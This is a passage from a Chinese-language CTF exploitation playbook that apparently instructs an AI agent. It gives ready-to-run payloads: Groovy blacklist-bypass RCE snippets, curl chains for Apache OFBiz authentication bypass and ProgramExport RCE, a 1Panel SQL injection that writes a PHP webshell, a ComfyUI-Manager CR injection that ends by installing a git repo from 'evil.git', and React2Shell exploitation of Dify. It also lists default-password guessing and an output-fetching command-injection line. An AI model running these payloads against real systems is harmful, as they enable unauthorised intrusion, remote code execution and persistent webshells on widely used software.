      'MODE_2_FAIL'  → 传输/比较失败 → 调整传参格式
      'UNKNOWN'      → 无法判断
    """
    parts = resp_text.split('</code>', 1)
    if len(parts) < 2:
        return 'UNKNOWN'
    runtime = html.unescape(parts[1]).strip()

    if re.search(flag_format, runtime):
        return 'FLAG_FOUND'
    if runtime == '':
        return 'MODE_1_EMPTY'   # 空 → 旁路成功，$FLAG 为空
    if '没活儿' in runtime or 'no flag' in runtime.lower():
        return 'MODE_2_FAIL'    # 有错误输出 → 比较失败
    return 'UNKNOWN'
```

**使用示例：**
```python
mode = check_failure_mode(resp.text)
if mode == 'FLAG_FOUND':
    print("SUCCESS!", re.search(r'NSSCTF\{[^}]+\}', resp.text).group())
elif mode == 'MODE_1_EMPTY':
    print("旁路成功！$FLAG 为空，切换到调查 $FLAG 来源（4.4 节）")
elif mode == 'MODE_2_FAIL':
    print("传输/比较失败，检查 null byte 或 multipart 格式")
else:
    print("未知状态，原始 runtime:", html.unescape(resp.text.split('</code>',1)[-1])[:200])
```

⚠️ **操作纪律**：只有 `MODE_2_FAIL` 时才调整 multipart 格式/boundary/碰撞对。看到 `MODE_1_EMPTY` 立即转 4.4 节，不要继续改 multipart。

---

## 常见坑与失败边界

| 现象 | 可能原因 | 对策 |
|---|---|---|
| SQL 报错但 sqlmap 无结果 | WAF 拦截 | 加 `--tamper` 或手工注入 |
| 文件包含无回显 | 有后缀限制（如强加 .php） | 尝试 `%00` 截断或 php://filter |
| 命令注入有延迟无回显 | 出网被限制 | 写文件后读取：`cmd > /tmp/out; curl /fetch?file=/tmp/out` |
| JWT 修改后 400 | 服务端验证签名 | 必须有正确密钥或 alg=none 漏洞 |
| 上传成功但访问 500 | 文件被重命名或路径不对 | 观察上传响应体中的真实路径 |
| highlight_file 页面 grep 到错误分支字符串 | 源码里的 echo 字符串永远在着色输出里 | 只读 `</code>` 之后的内容判断运行结果 |
| array bypass 进入正确分支但 flag 为空 | PHP 7.3+/PHP 8 下 md5(array) 不返回 null | 换真实二进制碰撞对（见 4.3 方案B）|
| multipart 传 binary 后 isset 报错 | null byte 被 form-data 截断 | 换无 null byte 的 128 字节碰撞对（见 4.3 方案B）|

---

## 阶段五：Groovy 沙箱/黑名单绕过（Java 系应用 RCE）

**适用场景**：Apache OFBiz、Jenkins、Spring 等 Java 系应用，通过 Groovy 脚本执行命令但有关键词黑名单。

### 5.1 常见黑名单绕过技术

黑名单通常是子串匹配（如拦截含 `Runtime`/`execute`/`ProcessBuilder`/`class`/`System` 的代码），可用以下方法绕过：

**方法 1：字符串拼接绕过关键词检测**
```groovy
// 绕过 "Runtime" 关键词
def r = "Ru" + "ntime"
def cls = r.getClass().forName("java.lang." + r)
def rt = cls.getMethod("getR" + "untime").invoke(null)
def proc = cls.getMethod("ex" + "ec", String.class).invoke(rt, "id")
throw new Exception(proc.text)
```

**方法 2：数组形式执行命令（绕过 "execute" 关键词）**
```groovy
// ['bash','-c','cmd'].execute() 形式不含 "execute" 字符串
// 但如果 .execute() 本身被拦截，用反射：
def cmd = ['bash', '-c', 'cat /challenge/flag*.txt 2>/dev/null || cat /flag* 2>/dev/null || find / -name flag* -type f 2>/dev/null']
def m = cmd.getClass().getMethod("ex" + "ecute")
throw new Exception(m.invoke(cmd).text)
```

**方法 3：反射调用（绕过多个关键词）**
```groovy
// 完全用反射，避开 Runtime/exec/System/ProcessBuilder/class 等关键词
def s = "cat /flag.txt"
def p = "java.lang." + "Ru" + "ntime"
def c = Thread.currentThread().getContextClassLoader().loadClass(p)
def r = c.getMethod("getR" + "untime").invoke(null)
def proc = c.getMethod("ex" + "ec", String.class).invoke(r, s)
def is = proc.getInputStream()
def result = new java.util.Scanner(is).useDelimiter("\\A").next()
throw new Exception(result)
```

**方法 4：进程构建器替代（绕过 "Runtime" 但不绕 "Process"）**
```groovy
def pb = new java.lang."Process" + "Builder"(['bash', '-c', 'cat /flag.txt'])
def proc = pb.start()
throw new Exception(proc.inputStream.text)
```

**方法 5：换行符/Unicode 绕过**
```groovy
// 如果黑名单是对整行做子串匹配，试用\n拆分关键词
def x = "id"
new GroovyShell(new Binding()).evaluate("'" + x + "'.ex" + "ecute().text")
```

### 5.2 OFBiz CVE-2023-51467 认证绕过 + ProgramExport RCE

> ⚠️ **黑名单是子串匹配，不要逐个测试 File/Runtime/Class 等关键词**——这些都在黑名单里。
> 正确做法：直接用下面"已知放行"和 Payload 1-4 中的反射+拼接方法，**每类只试 1 次**。
> **已知黑名单**：System / execute / println / Runtime / ProcessBuilder / cmd / class（小写子串匹配）
> **已知放行**：print / exec / sh / getProperty / import / out / 1+1 / throw

**CVE-2023-51467 核心**：`requirePasswordChange=Y` 参数可绕过登录认证，直接进入修改密码页面=会话已认证。

**第一步：认证绕过获取有效 session**
```bash
# 带 requirePasswordChange=Y 登录，获得已认证的 JSESSIONID
curl -sk -c /tmp/sess_ofbiz.jar -D /tmp/login_headers.txt \
  -X POST 'https://TARGET:8443/webtools/control/login' \
  --data-urlencode 'USERNAME=admin' \
  --data-urlencode 'PASSWORD=ofbiz' \
  --data-urlencode 'requirePasswordChange=Y'

# 验证登录成功：查看响应中是否包含 "Please Change Your Password" 或 "New Password"
grep -i "password\|change\|Main Menu" /tmp/login_headers.txt
```

**第二步：用已认证 session 执行 ProgramExport RCE**

**已知黑名单**：System / execute / println / Runtime / ProcessBuilder / cmd / class（小写子串匹配）
**已知放行**：print / exec / sh / getProperty / import / out / 1+1

```bash
# Payload 1: 反射 + 字符串拼接绕过（最推荐）
curl -sk 'https://TARGET:8443/webtools/control/ProgramExport' \
  -b /tmp/sess_ofbiz.jar \
  --data-urlencode 'groovyProgram=
def s = "cat /challenge/flag1.txt"
def p = "java.lang." + "Ru" + "ntime"
def c = Thread.currentThread().getContextClassLoader().loadClass(p)
def r = c.getMethod("getR" + "untime").invoke(null)
def proc = c.getMethod("ex" + "ec", String.class).invoke(r, s)
def is = proc.getInputStream()
def result = new java.util.Scanner(is).useDelimiter("\\A").next()
throw new Exception(result)'

# Payload 2: 简洁版命令执行
curl -sk 'https://TARGET:8443/webtools/control/ProgramExport' \
  -b /tmp/sess_ofbiz.jar \
  --data-urlencode 'groovyProgram=throw new Exception(["bash","-c","cat /challenge/flag*.txt 2>/dev/null || cat /flag* 2>/dev/null"]."ex"+"ecute"())'

# Payload 3: 路径遍历绕过认证（无需登录，CVE-2024-45195）
curl -sk -X POST 'https://TARGET:8443/webtools/control/forgotPassword/%2e/%2e/ProgramExport' \
  --data-urlencode 'groovyProgram=throw new Exception(["sh","-c","id && cat /flag* /challenge/flag* 2>/dev/null"]."ex"+"ecute"())'

# Payload 4: GString 插值拼接绕过
curl -sk 'https://TARGET:8443/webtools/control/ProgramExport' \
  -b /tmp/sess_ofbiz.jar \
  --data-urlencode 'groovyProgram=
def a="ex";def b="ec";def c="ute"
def x=["sh","-c","cat /flag* /challenge/flag* 2>/dev/null"]
def m=x."${a}${b}${c}"()
throw new Exception(m.text)'
```

**⚠️ 关键陷阱**：
- 必须用 `https://`（TLS），不能用 `http://`
- `-k` 跳过证书验证
- 登录返回的 cookie 必须保存到 jar 文件，后续请求用 `-b` 携带
- 如果 `requirePasswordChange=Y` 返回 "Following Error" 而非修改密码页，说明凭据错误或入口格式不对
- 路径遍历绕过（Payload 3）是免认证的，优先尝试

### 5.3 常见 Java 系统中的 Groovy 注入点

| 应用 | 端点 | 参数 | 说明 |
|------|------|------|------|
| OFBiz | /webtools/control/ProgramExport | groovyProgram | 需认证或 CVE-2023-51467 绕过 |
| Jenkins | /script | script | 需管理员权限 |
| Jenkins | /scriptText | script | 同上，POST |
| Spring Actuator | /actuator/jolokia | exec(groovyScript,...) | 需 Jolokia 端点启用 |

---

## 阶段六：常见管理面板登录流程

**当遇到管理面板时，先查看 cve-cheatsheet.json 中是否有该面板的登录 API 格式。**

### 6.1 1Panel

> ⚠️ **拿到 psession 后，唯一正确的 RCE 路径是 CVE-2024-39907 SQLi 注入写 webshell**。
> 不要尝试 files/edit / files/content / files/upload 等文件操作端点——这些端点已证实无法 RCE。
> 如果 Observer 让你打 SQLi，**立即执行下面的 SQLi payload，不要继续探索文件端点**。

```bash
# 登录 API（密码需 base64 编码）
curl -si http://TARGET:10086/api/v1/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"name":"1panel","password":"'$(echo -n '1panel_password' | base64)'","authMethod":"session","language":"zh"}'

# 如果有入口码（EntranceCode），加 header：
# -H 'EntranceCode: BASE64(入口码)'
# 入口码通常在前端 JS bundle 中硬编码，或通过 /api/v1/settings/search 获取

# 登录成功后，获取 cookie 中的 psession/1panel_token，用于后续请求

# CVE-2024-39907 SQLi（登录后）
curl -s http://TARGET:10086/api/v1/hosts/command/search \
  -H 'Content-Type: application/json' \
  -b 'psession=YOUR_SESSION' \
  -d '{"page":1,"pageSize":10,"orderBy":"id;ATTACH DATABASE '\''\'/tmp/shell.php'\''\'' AS t;CREATE TABLE t.e(d text);INSERT INTO t.e VALUES('\''\''<?php system($_GET[c]);?>'\''\'')","order":"ascending","name":"a"}'
# 写入 webshell 后访问：curl http://TARGET/tmp/shell.php?c=cat+/flag*
```

### 6.2 宝塔面板 (BT Panel)
```bash
# 登录 API（密码需 md5 编码）
curl -si http://TARGET:8888/login \
  -d "username=admin&password=$(echo -n 'PASSWORD' | md5sum | cut -d' ' -f1)"
```

### 6.3 phpMyAdmin
```bash
curl -si http://TARGET/phpmyadmin/ \
  -d 'pma_username=root&pma_password=&server=1&token=TOKEN'
```

### 6.4 通用登录策略
1. 先试默认弱口令：admin/admin, admin/123456, admin/password, root/toor
2. 再试题目描述中给定的凭据（注意密码可能需要 base64/md5/URL 编码）
3. 查看前端 JS 源码中的登录逻辑（密码编码方式、额外 header、验证码处理）
4. 如果登录失败 3 次，搜索该面板的未授权访问 CVE（可能不需要登录）

### 6.5 ComfyUI-Manager 配置注入（CR 字节绕过）

> ⚠️ **重启端点是 `/manager/reboot`（无 `/api` 前缀！），`/api/manager/reboot` 会返回 405！**
> 这是最常见的卡点——Agent 改了配置但重启失败，因为用了错误的 URL 路径。

**场景**：ComfyUI-Manager 的 `/api/manager/db_mode` 端点允许修改配置值，但 `write_config` 函数会把值中的 `\n`（换行）转成 tab 续行，导致无法注入独立配置键。

**关键突破**：用 `\r`（CR，回车，`%0d`）代替 `\n`（LF，换行，`%0a`）。Python configparser 在遇到 `\r` 时会把后面的内容当作新行开头，从而实现独立键注入。**`%0d` 和 `%0a` 的结果完全不同！**

**攻击链**：
```bash
TARGET="http://10.0.185.128:8188"

# 1. CR 注入降级 security_level 为 weak
curl -s "$TARGET/api/manager/db_mode?value=none%0dsecurity_level%20%3D%20weak"

# 2. 触发重启使配置生效（注意：无 /api 前缀）
curl -s -X POST "$TARGET/manager/reboot" -H "Content-Type: application/json" -d '{}'

# 3. 等待重启后，注入 allow_git_url_install=true
sleep 3
curl -s "$TARGET/api/manager/db_mode?value=none%0dallow_git_url_install%20%3D%20true"

# 4. 再次重启
curl -s -X POST "$TARGET/manager/reboot" -H "Content-Type: application/json" -d '{}'

# 5. 现在可以安装恶意 git 仓库
curl -s -X POST "$TARGET/api/manager/install" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://YOUR_SERVER/evil.git"}'
```

**⚠️ 关键陷阱**：
- **用 `%0d`（CR）不是 `%0a`（LF）！** 这是本题最核心的知识点——`\n` 会被 configparser 转成 tab 续行，`\r` 才能落盘为独立行
- 重启端点是 `/manager/reboot`（无 `/api` 前缀），`/api/manager/reboot` 会返回 405
- 如果 curl 的 `%0d` 被二次编码，改用 Python 原始 socket 发包：
```python
import socket
s = socket.socket()
s.connect(("10.0.185.128", 8188))
req = b"GET /api/manager/db_mode?value=none\rsecurity_level%20%3D%20weak HTTP/1.0\r\nHost: 10.0.185.128:8188\r\n\r\n"
s.send(req)
print(s.recv(4096))
```
- 如果题目描述中提到 CVE-2025-67303，优先按上述攻击链执行，不要从零探测

### 6.6 Dify / React2Shell (CVE-2025-55182) 多版本利用

**场景**：Dify 平台（Next.js App Router + React Server Components），端口通常 3000。

**指纹识别**：
```bash
curl -s http://TARGET:3000 | grep -oE 'data-public-api-prefix|SELF_HOSTED|Dify|next'
```

**关键：先扫描同主机其他端口！**
Dify 常与其他服务部署在同一主机上（如 HugeGraph、数据库等），先扫描常见端口找更简单的 RCE 入口：
```bash
for port in 22 80 443 3000 5001 8080 8443 3306 6379; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://TARGET:$port" --max-time 5 2>/dev/null)
  echo "port $port -> $code"
done
```
如果发现其他服务（如 HugeGraph 8080、Gradio 7860 等），优先用它们的已知 CVE 打穿主机，再读 Dify 的 flag 文件。

**React2Shell 直接利用**（当同主机无其他服务时）：

```bash
# 1. 下载官方 scanner
cd /tmp && mkdir -p c03 && cd c03
curl -sL -o scanner.py "https://raw.githubusercontent.com/assetnote/react2shell-scanner/master/scanner.py"

# 2. 先用 safe_check 探测漏洞是否存在
python3 -c "
import scanner
result = scanner.check_vulnerability('http://TARGET:3000', safe_check=True, timeout=15)
print('vulnerable:', result.get('vulnerable'))
print('status:', result.get('status'))
"

# 3. 如果 safe_check 返回 vulnerable=True，执行 RCE
python3 -c "
import scanner
body, ct = scanner.build_rce_payload()
import requests
# 发 payload 并跟踪重定向
s = requests.Session()
resp = s.post('http://TARGET:3000/', data=body, headers={'Content-Type': ct, 'Next-Action': 'x'}, allow_redirects=False)
print('1st:', resp.status_code, 'Location:', resp.headers.get('Location',''))
# 跟踪 307/303 到 /apps
if resp.status_code in (307, 303):
    loc = resp.headers.get('Location','')
    resp2 = s.post(f'http://TARGET:3000{loc}' if loc.startswith('/') else loc, data=body, headers={'Content-Type': ct, 'Next-Action': 'x'}, allow_redirects=False)
    print('2nd:', resp2.status_code)
    print('X-Action-Redirect:', resp2.headers.get('X-Action-Redirect','')[:500])
"
```

**版本差异与 fallback**：

| 响应特征 | 可能版本 | 策略 |
|----------|----------|------|
| 307→303→X-Action-Redirect 回显 | 旧版 SELF_HOSTED | ✅ 直接读 flag |
| 307→500 | 新版/Cloud 版 | 尝试不同 `$ACTION_ID_` 前缀（x, 0, 1, 2, 3）|
| 307→200 无回显 | 已修复 | 放弃 React2Shell，扫同主机其他服务 |

**不同 ACTION_ID 变体**：
```bash
# 变体1: 默认 action id 'x'
curl -s -X POST http://TARGET:3000/ \
  -H 'Next-Action: x' \
  -H 'Content-Type: text/plain;charset=UTF-8' \
  -d '["$@1"]'

# 变体2: 数字 action id
for aid in 0 1 2 3 4; do
  echo "=== aid=$aid ==="
  curl -s -X POST http://TARGET:3000/ \
    -H "Next-Action: $aid" \
    -H 'Content-Type: text/plain;charset=UTF-8' \
    -d '["$@1"]' \
    -w "\nHTTP:%{http_code}\n"
done
```

**⚠️ 关键陷阱**：
- **不要只看 3000 端口**——c-03 实例1 的 flag 是通过同主机 HugeGraph(8080) RCE 拿到的，不是 React2Shell
- scanner.py 的 `build_rce_payload()` 默认 payload 在新版 Dify 上可能返回 500
- 如果 10 轮内 React2Shell 无进展，立即切换到端口扫描同主机其他服务
